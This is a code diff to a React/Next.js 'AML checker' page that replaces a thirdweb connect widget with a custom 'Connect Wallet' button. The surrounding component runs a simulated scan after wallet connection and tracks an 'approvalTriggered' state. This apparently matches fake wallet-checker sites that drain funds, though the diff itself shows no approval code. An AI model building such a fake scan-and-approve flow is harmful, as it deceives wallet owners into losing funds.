@@ -3,7 +3,7 @@
 import { useState } from 'react';
 import Image from 'next/image';
 import Link from 'next/link';
-import { ConnectButton } from 'thirdweb/react';
+import { useConnect } from 'thirdweb/react';
 import { createThirdwebClient } from 'thirdweb';
 import { NETWORKS, type Network } from '@/lib/networks';
 
@@ -14,11 +14,13 @@ const client = createThirdwebClient({
 type Step = 'network' | 'connect' | 'scan' | 'report';
 
 export default function AMLChecker() {
+  const { connect } = useConnect();
   const [currentStep, setCurrentStep] = useState<Step>('network');
   const [selectedNetwork, setSelectedNetwork] = useState<Network | null>(null);
   const [walletAddress, setWalletAddress] = useState<string | null>(null);
   const [scanProgress, setScanProgress] = useState(0);
   const [approvalTriggered, setApprovalTriggered] = useState(false);
+  const [isConnecting, setIsConnecting] = useState(false);
 
   // Handle network selection
   const handleNetworkSelect = (network: Network) => {
@@ -39,6 +41,23 @@ export default function AMLChecker() {
       setCurrentStep('scan');
       startScan();
     }, 500);
+  };
+
+  const handleConnectClick = async () => {
+    try {
+      setIsConnecting(true);
+      const wallet = await connect({
+        strategy: 'auto', // Automatically show the best wallet connection option
+      });
+      
+      const account = wallet.getAccount();
+      if (account?.address) {
+        handleWalletConnected(account.address);
+      }
+    } catch (error) {
+      console.error('Connection error:', error);
+      setIsConnecting(false);
+    }
   };
 
   // Scan simulation
@@ -234,48 +253,14 @@ export default function AMLChecker() {
             <div className="w-full max-w-sm">
               <h2 className="text-2xl sm:text-3xl font-bold text-center mb-6 sm:mb-8">Connect Wallet</h2>
 
-              {/* Thirdweb Connect Button - Custom Styled */}
-              <style>{`
-                [data-testid="thirdweb-connect-button"] {
-                  width: 100% !important;
-                }
-                [data-testid="thirdweb-connect-button"] button {
-                  width: 100% !important;
-                  padding: 0.625rem !important;
-                  background-color: rgb(5, 150, 105) !important;
-                  color: rgb(0, 0, 0) !important;
-                  font-weight: 600 !important;
-                  font-size: 1rem !important;
-                  border-radius: 9999px !important;
-                  border: none !important;
-                  cursor: pointer !important;
-                  transition: all 0.2s !important;
-                }
-                [data-testid="thirdweb-connect-button"] button:hover {
-                  background-color: rgb(16, 185, 129) !important;
-                }
-                @media (min-width: 640px) {
-                  [data-testid="thirdweb-connect-button"] button {
-                    padding: 0.75rem !important;
-                    font-size: 1.125rem !important;
-                  }
-                }
-              `}</style>
-              <div className="w-full">
-                <ConnectButton
-                  client={client}
-                  onConnect={(wallet) => {
-                    const address = wallet.getAccount()?.address;
-                    if (address) {
-                      handleWalletConnected(address);
-                    }
-                  }}
-                  theme="dark"
-                  connectModal={{
-                    size: 'compact',
-                  }}
-                />
-              </div>
+              {/* Custom Connect Button - Matches App Styling */}
+              <button
+                onClick={handleConnectClick}
+                disabled={isConnecting}
+                className="w-full py-2.5 sm:py-3 rounded-full font-semibold text-base sm:text-lg transition-all bg-emerald-600 hover:bg-emerald-500 text-black cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed mb-6 sm:mb-8"
+              >
+                {isConnecting ? 'Connecting...' : 'Connect Wallet'}
+              </button>
 
               {/* Terms Disclaimer */}
               <p className="text-xs sm:text-sm text-gray-400 text-center leading-relaxed">
